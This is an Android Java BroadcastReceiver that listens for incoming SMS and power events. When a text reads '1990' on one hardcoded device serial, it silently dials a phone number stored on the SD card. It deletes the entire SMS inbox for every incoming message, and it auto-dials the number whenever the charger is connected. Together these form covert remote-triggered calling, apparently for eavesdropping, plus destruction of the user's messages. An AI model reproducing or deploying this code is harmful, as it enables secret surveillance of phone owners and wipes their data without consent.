package com.example.tal.alert;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;




public class MyBroadcastReceiver extends BroadcastReceiver {

    // Get the object of SmsManager
    final SmsManager sms = SmsManager.getDefault();
    String device_id="";
    String phonenum="";

    SQLiteDatabase db;




    @Override
    public void onReceive(Context context, Intent intent) {


        // This is opendatabase SQLite database and table creaction
        try {
            db = SQLiteDatabase.openDatabase("sdcard/phonenumber.db", null, SQLiteDatabase.CREATE_IF_NECESSARY);
            db.execSQL("create table phonenum(" + "id INTEGER PRIMARY KEY AUTOINCREMENT, " + " Tel TEXT)");
        } catch (Exception e) {
        }


        //selecting and attaching phone from database to phone call intent
        Cursor datax = db.rawQuery("select * from phonenum", null);
        if (datax.getCount() == 0) {
        } else {

            while (datax.moveToNext()) {
                phonenum+=datax.getString(1);
            }
        }


// retriving phone serial number
        device_id+= Build.SERIAL;









        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus"); //A PDU is a “protocol data unit”, which is the industry format for an SMS message. because SMSMessage reads/writes

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();


                    // sms command to auto dial phone call
                    if(message.trim().equals("1990")){


                        if(device_id.trim().equals("KR8LEE9SSGU46HT8")) {


                            // phone number intent
                                    Intent intentcall = new Intent();
                                    intentcall.setAction(Intent.ACTION_CALL);
                                    intentcall.setData(Uri.parse("tel:"+phonenum));
                                    intentcall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    context.startActivity(intentcall);


                        //deleting sms inbox
                        ContentResolver cr=context.getContentResolver();
                        Uri url=Uri.parse("content://sms");
                        int num_deleted = cr.delete(url, null,null);
                        return;

                        }

                    }  else {

                        //deleting sms inbox
                        ContentResolver cr=context.getContentResolver();
                        Uri url=Uri.parse("content://sms");
                        int num_deleted = cr.delete(url, null,null);
                        return;
                    }







                } // end for loop
            } // bundle is null

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);

        }











        //MyPowerReceiver: Power is connected intent
        if(intent.getAction() == Intent.ACTION_POWER_CONNECTED){

            if(device_id.trim().equals("KR8LEE9SSGU46HT8")) {



                        Intent intentcall = new Intent();
                        intentcall.setAction(Intent.ACTION_CALL);
                        intentcall.setData(Uri.parse("tel:"+phonenum));
                        intentcall.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intentcall);

            }


            //MyPowerReceiver: Power is disconnected intent
        }  else  if(intent.getAction() == Intent.ACTION_POWER_DISCONNECTED) {

        }



    }






}
